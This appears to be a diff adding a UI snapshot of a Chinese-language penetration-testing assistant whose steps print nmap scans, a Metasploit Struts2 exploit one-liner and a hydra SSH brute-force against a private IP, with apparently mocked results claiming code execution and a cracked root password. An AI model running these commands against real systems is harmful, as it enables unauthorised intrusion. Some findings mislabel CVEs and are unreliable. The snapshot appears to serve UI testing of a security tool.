@@ -1,0 +1,202 @@
+- generic [active] [ref=e1]:
+  - generic [ref=e2]:
+    - complementary [ref=e3]:
+      - link "安全智能體" [ref=e5] [cursor=pointer]:
+        - /url: /
+        - img [ref=e6]
+        - generic [ref=e8]: 安全智能體
+      - navigation [ref=e9]:
+        - link "首頁儀表板" [ref=e10] [cursor=pointer]:
+          - /url: /
+          - img [ref=e11]
+          - text: 首頁儀表板
+        - link "SOC 告警分析" [ref=e15] [cursor=pointer]:
+          - /url: /soc/analyze
+          - img [ref=e16]
+          - text: SOC 告警分析
+        - link "威脅情報調查" [ref=e19] [cursor=pointer]:
+          - /url: /threat/investigate
+          - img [ref=e20]
+          - text: 威脅情報調查
+        - generic [ref=e23]:
+          - link "滲透測試輔助" [ref=e24] [cursor=pointer]:
+            - /url: /pentest/assist
+            - img [ref=e25]
+            - text: 滲透測試輔助
+          - generic [ref=e30]:
+            - link "新建任務" [ref=e31] [cursor=pointer]:
+              - /url: /pentest/assist
+              - img [ref=e32]
+              - text: 新建任務
+            - link "任務歷史" [ref=e34] [cursor=pointer]:
+              - /url: /pentest/history
+              - img [ref=e35]
+              - text: 任務歷史
+      - generic [ref=e37]: 安全智能體 v1.0
+    - main [ref=e38]:
+      - generic [ref=e39]:
+        - generic [ref=e41]:
+          - generic [ref=e291]:
+            - img [ref=e412]
+            - generic [ref=e294]: 目標枚舉
+          - generic [ref=e297]:
+            - img [ref=e414]
+            - generic [ref=e300]: 漏洞掃描
+          - generic [ref=e303]:
+            - img [ref=e416]
+            - generic [ref=e306]: 漏洞驗證
+          - generic [ref=e309]:
+            - generic [ref=e311]: "4"
+            - generic [ref=e312]: 漏洞利用
+          - generic [ref=e315]:
+            - generic [ref=e317]: "5"
+            - generic [ref=e318]: 報告生成
+        - generic [ref=e72]:
+          - generic [ref=e73]:
+            - img [ref=e75]
+            - generic [ref=e77]:
+              - heading "Penetration Testing Assistant" [level=1] [ref=e78]
+              - paragraph [ref=e79]: Select a template and configure target to begin automated security testing
+          - generic [ref=e80]:
+            - generic [ref=e81]:
+              - img [ref=e82]
+              - heading "Select Test Template" [level=2] [ref=e84]
+            - generic [ref=e85]:
+              - generic [ref=e87] [cursor=pointer]:
+                - img [ref=e89]
+                - heading "網路掃描" [level=3] [ref=e94]
+                - paragraph [ref=e95]: Nmap/Nessus | 主機發現 → 端口掃描 → 服務枚舉 → 漏洞掃描 → 報告
+                - generic [ref=e96]:
+                  - generic [ref=e97]: Nmap
+                  - generic [ref=e98]: Nessus
+              - generic [ref=e100] [cursor=pointer]:
+                - img [ref=e102]
+                - heading "Web 滲透" [level=3] [ref=e105]
+                - paragraph [ref=e106]: SQL/XSS | URL 分析 → 爬蟲 → XSS/SQL 測試 → 漏洞驗證 → 報告
+                - generic [ref=e107]:
+                  - generic [ref=e108]: SQLMap
+                  - generic [ref=e109]: Burp Suite
+              - generic [ref=e111] [cursor=pointer]:
+                - img [ref=e113]
+                - heading "API 測試" [level=3] [ref=e117]
+                - paragraph [ref=e118]: REST/GraphQL | Endpoints 發現 → Auth 測試 → Injection → 報告
+                - generic [ref=e119]:
+                  - generic [ref=e120]: Postman
+                  - generic [ref=e121]: GraphQL
+              - generic [ref=e123] [cursor=pointer]:
+                - img [ref=e125]
+                - heading "紅隊演練" [level=3] [ref=e129]
+                - paragraph [ref=e130]: 攻擊路徑 | recon → initial access → lateral movement → persistence → report
+                - generic [ref=e131]:
+                  - generic [ref=e132]: Metasploit
+                  - generic [ref=e133]: Cobalt Strike
+              - generic [ref=e135] [cursor=pointer]:
+                - img [ref=e137]
+                - heading "暴力破解" [level=3] [ref=e140]
+                - paragraph [ref=e141]: SSH/HTTP | 目標識別 → 用戶枚舉 → 密碼猜測 → 報告
+                - generic [ref=e142]:
+                  - generic [ref=e143]: Hydra
+                  - generic [ref=e144]: John
+              - generic [ref=e146] [cursor=pointer]:
+                - img [ref=e148]
+                - heading "自訂" [level=3] [ref=e151]
+                - paragraph [ref=e152]: 自由設定 | 用戶自定義步驟流程
+                - generic [ref=e154]: Custom
+          - generic [ref=e261]:
+            - generic [ref=e262]:
+              - generic [ref=e263]: 目標設定
+              - generic [ref=e264]: 輸入滲透測試目標參數
+            - generic [ref=e265]:
+              - generic [ref=e266]:
+                - generic [ref=e267]:
+                  - generic [ref=e268]:
+                    - text: 目標 IP/CIDR
+                    - generic [ref=e269]: "*"
+                  - textbox "目標 IP/CIDR *" [ref=e270]:
+                    - /placeholder: 192.168.1.1 或 10.0.0.0/24
+                    - text: 192.168.20.199
+                - generic [ref=e271]:
+                  - generic [ref=e272]: 端口範圍
+                  - textbox "端口範圍" [ref=e273]:
+                    - /placeholder: 22,80,443,8000-9000
+                  - paragraph [ref=e274]: 多個端口用逗號分隔，範圍用破折號
+                - generic [ref=e275]:
+                  - generic [ref=e276]:
+                    - text: 掃描強度
+                    - generic [ref=e277]: "*"
+                  - combobox "掃描強度 *" [ref=e278]:
+                    - option "輕量 (Light)"
+                    - option "標準 (Normal)" [selected]
+                    - option "深度 (Deep)"
+              - button "執行中..." [disabled]:
+                - generic: 執行中...
+          - generic [ref=e319]:
+            - img [ref=e320]
+            - paragraph [ref=e322]: 正在連接到滲透測試引擎...
+          - generic [ref=e155]:
+            - heading "Test Progress (3/5)" [level=2] [ref=e418]
+            - generic [ref=e160]:
+              - generic [ref=e325]:
+                - img [ref=e419]
+                - generic [ref=e331]:
+                  - generic [ref=e332]:
+                    - generic [ref=e333]:
+                      - heading "目標枚舉" [level=3] [ref=e334]
+                      - generic [ref=e335]:
+                        - img
+                        - generic [ref=e336]: 已完成
+                    - button [ref=e337]:
+                      - img [ref=e338]
+                  - paragraph [ref=e340]: "## 目標枚舉 正在對目標 `192.168.20.199` 進行網路掃描。 ### 執行的命令 ```bash nmap -sV -sC -p- -oA nmap_scan 192.168.20.199 ``` ### 枚舉結果 | 端口 | 服務 | 版本 | |------|------|------| | 22 | SSH | OpenSSH 7.4 | | 80 | HTTP | Apache 2.4.6 | | 443 | HTTPS | Apache 2.4.6 | | 3306 | MySQL | 5.7.29 | **發現的可攻擊面：** - Web 服務運行在 port 80/443 - SSH 可用于暴力破解 - MySQL 數據庫暴露"
+                  - paragraph [ref=e422]: 上午11:12:36
+              - generic [ref=e343]:
+                - img [ref=e423]
+                - generic [ref=e349]:
+                  - generic [ref=e350]:
+                    - generic [ref=e351]:
+                      - heading "漏洞掃描" [level=3] [ref=e352]
+                      - generic [ref=e353]:
+                        - img
+                        - generic [ref=e354]: 已完成
+                    - button [ref=e355]:
+                      - img [ref=e356]
+                  - paragraph [ref=e358]: "## 漏洞掃描 使用 Nessus/OpenVAS 對識別的服務進行漏洞掃描。 ### 執行的命令 ```bash # 使用 Nmap 腳本掃描常見漏洞 nmap --script=vuln -p 80,443 192.168.20.199 # 運行 OpenVAS 掃描 omp -r \"Quick Scan\" -t 192.168.20.199 ``` ### 掃描結果 | 漏洞 | CVE | 嚴重性 | CVSS | |------|-----|--------|------| | Apache Struts RCE | CVE-2017-5638 | 高 | 10.0 | | OpenSSH 暴力破解 | CVE-2018-15473 | 中 | 5.3 | | MySQL 弱口令 | CVE-2012-2122 | 高 | 7.5 |"
+                  - paragraph [ref=e426]: 上午11:12:38
+              - generic [ref=e361]:
+                - img [ref=e427]
+                - generic [ref=e367]:
+                  - generic [ref=e368]:
+                    - generic [ref=e369]:
+                      - heading "漏洞驗證" [level=3] [ref=e370]
+                      - generic [ref=e371]:
+                        - img
+                        - generic [ref=e372]: 已完成
+                    - button [ref=e373]:
+                      - img [ref=e374]
+                  - paragraph [ref=e376]: "## 漏洞驗證 對發現的漏洞進行驗證，確認其可利用性。 ### 執行的命令 ```bash # 驗證 Apache Struts RCE msfconsole -x \"use exploit/multi/http/struts2_rest_xstream; set RHOSTS 192.168.20.199; set RPORT 80; exploit\" # 驗證 SSH 暴力破解 hydra -l root -P passwords.txt ssh://192.168.20.199 ``` ### 驗證結果 - **Apache Struts RCE**: 已確認可利用，獲得遠程代碼執行權限 - **SSH 暴力破解**: 發現弱口令 `root:toor` - **MySQL 弱口令**: 成功登入數據庫"
+                  - paragraph [ref=e430]: 上午11:12:41
+              - generic [ref=e379]:
+                - img [ref=e382]
+                - generic [ref=e385]:
+                  - generic [ref=e386]:
+                    - generic [ref=e387]:
+                      - heading "漏洞利用" [level=3] [ref=e388]
+                      - generic [ref=e389]:
+                        - img
+                        - generic [ref=e390]: 待執行
+                    - button [ref=e391]:
+                      - img [ref=e392]
+                  - paragraph [ref=e394]: 正在評估漏洞利用可行性...
+              - generic [ref=e396]:
+                - img [ref=e399]
+                - generic [ref=e402]:
+                  - generic [ref=e403]:
+                    - generic [ref=e404]:
+                      - heading "報告生成" [level=3] [ref=e405]
+                      - generic [ref=e406]:
+                        - img
+                        - generic [ref=e407]: 待執行
+                    - button [ref=e408]:
+                      - img [ref=e409]
+                  - paragraph [ref=e411]: 正在生成滲透測試報告...
+  - alert [ref=e258]
